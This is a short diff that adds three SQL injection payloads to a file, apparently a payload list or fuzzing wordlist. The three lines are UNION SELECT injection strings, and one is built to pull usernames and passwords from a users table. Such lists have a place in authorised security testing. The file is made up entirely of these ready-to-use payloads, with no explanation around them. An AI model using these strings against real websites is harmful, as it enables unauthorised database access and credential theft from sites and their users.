@@ -1,0 +1,3 @@
+' UNION SELECT NULL, NULL, NULL--
+' UNION SELECT username, password FROM users--
+' UNION SELECT 1, 'test', 3--
